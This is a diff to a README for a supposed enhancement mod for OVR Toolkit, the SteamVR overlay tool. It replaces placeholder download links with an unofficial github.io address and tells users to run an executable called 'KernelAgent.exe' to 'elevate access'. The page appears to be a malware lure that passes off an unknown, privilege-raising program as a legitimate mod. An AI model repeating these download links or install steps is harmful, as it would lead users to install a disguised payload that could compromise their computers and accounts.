@@ -2,13 +2,15 @@
 
 This mod enhances OVR Toolkit with improved window pinning, smoother input, and deeper SteamVR integration. Designed for VR users who multitask, stream, or manage multiple overlays inside headset.
 
-[![Download Mod+](https://img.shields.io/badge/Download-OVR_Toolkit_Mod+-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Mod+](https://img.shields.io/badge/Download-OVR_Toolkit_Mod+-blueviolet)](https://ovr-toolkit-vr-overlay-enhancer.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ovr-toolkit-vr-overlay-enhancer.github.io/.github
+) section  
 2. 📁 **Extract contents** to any location (e.g. `C:\OVRToolkitMod`)  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to apply overlay input patch and elevate access)  
 4. 🧠 Launch SteamVR, then open `OVRToolkitMod.exe`  
